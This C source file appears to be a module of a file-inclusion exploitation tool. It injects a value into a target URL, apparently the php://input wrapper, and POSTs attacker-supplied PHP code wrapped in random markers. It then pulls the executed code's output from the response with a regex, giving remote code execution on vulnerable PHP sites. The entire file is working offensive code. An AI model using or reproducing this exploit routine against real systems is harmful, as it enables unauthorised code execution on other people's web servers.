#include "techniques/php-input.h"
#include "request/request.h"
#include "regex/pcre.h"
#include "string/concat.h"
#include "string/url.h"
#include "string/utils.h"
#include "output.h"

char *php_input(url_t *url, const char *input, const char *code, int pos)
{
	char *target = buildurl(url, string_replace, input, pos);
	char *res = php_input_rce(target, code);

	free(target);
	return res;
}

char *php_input_rce(const char *target, const char *code)
{
	char *res = NULL, mark[8], regex[7 * 2 + 5], *inject, **matches;

	request_t req;
	int len = -1;

	randomstr(mark, sizeof(mark));
	concatlb(regex, mark, "(.*)", mark, NULL);

	inject = concatl(mark, code, mark, NULL);
	request_init(&req);

	curl_easy_setopt(req.ch, CURLOPT_URL, target);
	curl_easy_setopt(req.ch, CURLOPT_POSTFIELDS, inject);
	curl_easy_setopt(req.ch, CURLOPT_POSTFIELDSIZE, strlen(inject));

	if (request_exec(&req)) {
		goto end;
	}

	matches = regex_extract(&len, regex, req.body.ptr, req.body.len, PCRE_DOTALL);
	if (len > 0) {
		res = xstrdup(matches[0]);
		regex_free(matches, len);
	}

end:
	free(inject);
	request_free(&req);
	return res;
}
